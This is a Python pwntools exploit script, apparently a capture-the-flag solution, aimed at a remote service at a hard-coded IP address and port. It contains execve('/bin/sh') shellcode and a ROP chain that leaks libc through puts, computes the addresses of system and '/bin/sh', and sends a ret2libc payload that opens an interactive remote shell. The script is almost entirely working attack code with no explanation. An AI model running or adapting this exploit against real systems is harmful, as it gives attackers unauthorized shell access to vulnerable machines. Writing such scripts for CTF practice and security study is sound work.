from pwn import *


shellcode="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

puts_plt=0x08049030
entry=0x8049070
main=0x80491b7
libc_start_main_got=0x0804c010
scanf_got=0x0804c018
nop_ret=0x080490af
for i in range(100):
    p=remote("54.225.38.91",1028)
    p.recvline()
    p.recvline()
    payload=""
    payload+=p32(puts_plt)
    payload+=p32(entry)
    payload+=p32(scanf_got)
    payload=payload*(108/12)
    p.sendline(payload)
    try:
        data=u32(p.recv()[:4])
        base=data-0x055360
        system=base+0x0458b0
        binsh=base+0x19042d
        print "leak:",hex(data)
        print "base:",hex(base)
        print "system:",hex(system)
        print "binsh:",hex(binsh)
        payload=""
        payload+=p32(nop_ret)*(96/4)
        payload+=p32(system)
        payload+=p32(main)
        payload+=p32(binsh)
        pause()
        p.sendline(payload)
        p.interactive()
    except:
        c=0
    p.close()



















